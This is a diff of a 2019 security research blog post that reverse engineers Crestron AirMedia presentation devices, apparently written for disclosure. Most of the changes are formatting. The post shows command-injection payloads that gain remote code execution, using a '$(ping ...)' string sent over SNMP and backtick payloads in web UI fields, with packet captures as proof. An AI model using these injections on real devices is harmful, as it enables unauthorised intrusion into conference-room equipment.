@@ -2,6 +2,10 @@
 layout: post
 title:  "Man-in-the-Conference-Room - Part IV (Vulnerability Research & Development)"
 date:   2019-03-27 10:00:00
+author: qkaiser
+image: /assets/awind_sources_sinks3.png
+excerpt: |
+    In this fourth installation of my blog series about wireless presentation devices we’ll cover one of the part I really love: vulnerability research and development.
 comments: true
 categories: pentesting
 ---
@@ -16,7 +20,7 @@ I'll focus on network services discovered and reverse engineered in **part III**
 
 We'll start by mounting the root filesystem we acquired with our firmware dumping script:
 
-<pre>
+{% highlight bash %}
 $ sudo losetup -v -f mmc_dump.bin
 $ sudo losetup -a
 /dev/loop0: [0046]:9755872 (/home/quentin/research/airmedia/hardware/dumps/dd/mmc_dump.bin)
@@ -40,11 +44,11 @@ $ sudo blkid /dev/loop0*
 /dev/loop0p3: UUID="7A5C-49D2" TYPE="vfat"
 /dev/loop0p4: LABEL="InternalMem" UUID="7A69-9C39" TYPE="vfat"
 $ sudo mount -o ro /dev/loop0p2 /mnt/tmp
-</pre>
+{% endhighlight %}
 
 My first step here is to list custom shell script that have been added by the manufacturer:
 
-<pre>
+{% highlight bash %}
 $ cd /mnt/tmp && find -name "*.sh"
 ./mnt/set_ap_client.sh
 ./mnt/wpsd/stopWPSD.sh
@@ -87,7 +91,7 @@ $ cd /mnt/tmp && find -name "*.sh"
 ./usr/bin/modify_res.sh
 ./usr/bin/setenv.sh
 ./usr/bin/wmt-ut.sh
-</pre>
+{% endhighlight %}
 
 After a manual code review of those scripts, I identified potentialy harmful code in the following scripts:
 
@@ -153,7 +157,7 @@ fi
 
 This script is used to enable/disable services such as network services or USB support. Once again, comments are mine.
 
-```bash
+{% highlight bash %}
 #!/bin/sh
 ACTION=$1
 SERVICE=$2
@@ -170,13 +174,13 @@ else [ "$ACTION" = "set" ]
     /mnt/AwGetCfg set $SERVICE $ONOFF
     /bin/rm /tmp/serviceLock -f && exit 0
 fi
-```
+{% endhighlight %}
 
 **ftpfw.sh**
 
 This script seems to be used to download a firmware update over FTP and apply it:
 
-```bash
+{% highlight bash %}
 #!/bin/sh
 
 # --- SNIPPED CONTENT ---
@@ -206,13 +210,13 @@ else
     /usr/sbin/ftpget -v -u $ftpaccount -p $ftppawd $ftphost -P $ftpport /tmp/romfs $ftpurl
 fi
 # --- SNIPPED CONTENT ---
-```
+{% endhighlight %}
 
 ---
 
 By grepping for those scripts names, we can identify that they are launched by one of the web server's CGI script (**return.cgi**), the SNMP server (**snmpd**) and a custom Airmedia binary (**CIPBridge**):
 
-<pre>
+{% highlight bash %}
 $ grep getRemoteURL . -r
 Binary file ./home/boa/cgi-bin/return.cgi matches
 Binary file ./usr/bin/snmpd matches
@@ -223,11 +227,11 @@ Binary file ./usr/bin/snmpd matches
 Binary file ./usr/bin/CIPBridge matches
 $ grep ftpfw . -r
 Binary file ./usr/bin/snmpd matches
-</pre>
+{% endhighlight %}
 
 We can also check *how* they're launched using *strings* and grepping for script names:
 
-<pre>
+{% highlight bash %}
 $ strings ./home/boa/cgi-bin/return.cgi | grep -E "getRemote|service_onoff"
 /bin/service_onoff.sh set %s %s
 /bin/getRemoteURL.sh %s
@@ -244,10 +248,11 @@ $ strings ./usr/bin/CIPBridge | grep -E "getRemote|service_onoff|ftpfw"
 /bin/service_onoff.sh set CIP_ONOFF 1 &
 /bin/service_onoff.sh set CIP_ONOFF 0 &
 /bin/getRemoteURL.sh %s %s %s %d
-</pre>
+{% endhighlight %}
 
 Ok so we might be onto something here. Let's recap with a quick diagram of sources and sinks:
 
+{:.foo}
 ![awind_sources_sinks]({{site.url}}/assets/awind_sources_sinks.png)
 
 **Note**: CIPBridge was purposefuly dropped because it's a service that must be configured to talk to a Crestron Virtual Server which is only available to Crestron customers, which I'm not. Still, if anyone got that software it is worth looking into it.
@@ -258,7 +263,7 @@ Ok so we might be onto something here. Let's recap with a quick diagram of sourc
 
 The first step to check if we can reach sinks via SNMP is to load the custom [MIB](https://en.wikipedia.org/wiki/Management_information_base) from Airmedia. That MIB file can be extracted from specific firmware archives available on Crestron [support website](https://www.crestron.com/Products/Workspace-Solutions/Wireless-Presentation-Solutions/AirMedia-Presentation-Gateways/AM-101). These ZIP archives holds firmware images for each processor family, a manifest, release notes, and the custom MIB file we are looking for:
 
-<pre>
+{% highlight bash %}
 $ unzip software_airmedia_am-100_1.5.0_am-101_2.6.0_firmware.zip -d firmware
 Archive:  software_airmedia_am-100_1.5.0_am-101_2.6.0_firmware.zip
 inflating: firmware/am-100_am-101_release_notes.html
@@ -267,13 +272,13 @@ inflating: firmware/AM-100_firmware_1.5.0.4_6506508_WM8440.img
 inflating: firmware/AM-101_firmware_2.6.0.12_6508053_WM8750A.img
 inflating: <b>firmware/crestron_AirMedia.mib</b>
 inflating: firmware/Manifest.xml
-</pre>
+{% endhighlight %}
 
 On a Linux based host you just have to copy the MIB file to `~/.snmp/mibs`. Once it's copied there, you can use `snmptranslate` to lookup items within the MIB:
 
-<pre>
+{% highlight bash %}
 $ for object in `snmptranslate -m +CRESTRON-WPS-MIB -TB 'cam*'`; do echo $object; snmptranslate -m +CRESTRON-WPS-MIB -IR -On $object; done > translated_mibs.txt
-</pre>
+{% endhighlight %}
 
 With this one line you'll get each SNMP OID and corresponding name:
 
@@ -533,26 +538,28 @@ Then, *camFWUpgradeFTPActive* can be used to trigger the firmware upgrade, and t
 
 Ok. Let's give it a try by injecting a payload in the FTP account value. Note that the string must be an exact length, hence the padding of A's.
 
-<pre>
+{% highlight bash %}
 $ snmpset -v2c -c private -m +CRESTRON-WPS-MIB 192.168.100.2 camFWUpgradeFTPAccount.0 s '$(ping -c 3 192.168.100.1)AAAAA'
 CRESTRON-WPS-MIB::camFWUpgradeFTPAccount.0 = STRING: $(ping -c 3 192.168.100.1)AAAAA
-</pre>
+{% endhighlight %}
 
 Now we trigger the upgrade sequence:
-<pre>
+
+{% highlight bash %}
 $ snmpset -v2c -c private -m +CRESTRON-WPS-MIB 192.168.100.2 camFWUpgradeFTPActive.0 i 1
 CRESTRON-WPS-MIB::camFWUpgradeFTPActive.0 = INTEGER: 1
-</pre>
+{% endhighlight %}
 
 And voilà ! Remote command execution via SNMP:
-<pre>
+
+```
 13:04:31.599851 IP 192.168.100.2 > 192.168.100.1: ICMP echo request, id 60686
 13:04:31.599925 IP 192.168.100.1 > 192.168.100.2: ICMP echo reply, id 60686
 13:04:32.601065 IP 192.168.100.2 > 192.168.100.1: ICMP echo request, id 60686
 13:04:32.601100 IP 192.168.100.1 > 192.168.100.2: ICMP echo reply, id 60686
 13:04:33.604441 IP 192.168.100.2 > 192.168.100.1: ICMP echo request, id 60686
 13:04:33.604538 IP 192.168.100.1 > 192.168.100.2: ICMP echo reply, id 60686
-</pre>
+```
 
 During the development of a full blown exploit I came upon two issues:
 
@@ -588,6 +595,7 @@ And here is the exploit at work:
 
 Let's update our sources and sinks diagram with what we learned. One path to **getRemoteURL.sh** via SNMP got removed, the path to **service_onoff.sh** got deactivated and the one to **ftpfw.sh** got confirmed.
 
+{:.foo}
 ![awind_sources_sinks2]({{site.url}}/assets/awind_sources_sinks2.png)
 
 We'll now move onto exploitation by abusing the web GUI running on ports TCP/80 and TCP/443.
@@ -596,6 +604,7 @@ We'll now move onto exploitation by abusing the web GUI running on ports TCP/80 
 
 Browsing through the web UI, we end up on the "OSD setup" page that let's you select a custom logo, which is exactly the purpose of one of our sinks: **getRemoteURL.sh**.
 
+{:.foo}
 ![airmedia_logo_ui]({{site.url}}/assets/airmedia_logo_ui.png)
 
 The injection is pretty straightforward as we simply put our payload in backticks within the address field:
@@ -636,19 +645,20 @@ command=<span class="nv">&lt;Send&gt;&lt;seid&gt;</span><span class="nb">PZs0x6i
 
 We get instant confirmation that our payload got executed:
 
-<pre>
+```
 192.168.100.2 > 192.168.100.1: ICMP echo request, id 35950
 192.168.100.1 > 192.168.100.2: ICMP echo reply, id 35950
 192.168.100.2 > 192.168.100.1: ICMP echo request, id 35950
 192.168.100.1 > 192.168.100.2: ICMP echo reply, id 35950
 192.168.100.2 > 192.168.100.1: ICMP echo request, id 35950
 192.168.100.1 > 192.168.100.2: ICMP echo reply, id 35950
-</pre>
+```
 
 ---
 
 Our second sink, **service_onoff.sh** must be linked to this page that let administrators enable or disable network services:
 
+{:.foo}
 ![airmedia_services_ui]({{site.url}}/assets/airmedia_services_ui.png)
 
 Again, exploitation is straight forward as we just have to put our payload between backticks in the *value* field.
@@ -684,14 +694,14 @@ command=<span class="nv">&lt;Send&gt;&lt;seid&gt;</span><span class="nb">xfnCLxT
 
 And again, instant confirmation that our payload got executed:
 
-<pre>
+```
 192.168.100.2 > 192.168.100.1: ICMP echo request, id 44410
 192.168.100.1 > 192.168.100.2: ICMP echo reply, id 44410
 192.168.100.2 > 192.168.100.1: ICMP echo request, id 44410
 192.168.100.1 > 192.168.100.2: ICMP echo reply, id 44410
 192.168.100.2 > 192.168.100.1: ICMP echo request, id 44410
 192.168.100.1 > 192.168.100.2: ICMP echo reply, id 44410
-</pre>
+```
 
 ---
 
@@ -720,6 +730,7 @@ When the admin user logs in, a session token is generated and must be appended a
 
 Access to remote view is unprotected by default but if the administrator choose to protect it (see setting below), the end user must enter the association PIN code on the web interface to access the remote view.
 
+{:.foo}
 ![airmedia_services_ui]({{site.url}}/assets/awind_viewers_ui.png)
 
 When the end user logs in with the remote view PIN code the server issues the same kind of session token that is used for administrators and moderators users.
@@ -728,12 +739,14 @@ There is no authorization checks performed to verify that a valid session token 
 
 Let's conclude our two successful RCE findings with an updated sources and sinks diagrams:
 
+{:.foo}
 ![awind_sources_sinks3]({{site.url}}/assets/awind_sources_sinks3.png)
 
 ### 3. Exploitation Paths
 
 You might have guessed that I really like visualizations so here is one describing the different exploitation paths that you could take.
 
+{:.foo}
 ![attack_path.png]({{site.url}}/assets/attack_path.png)
 
 ### 4. Good mentions
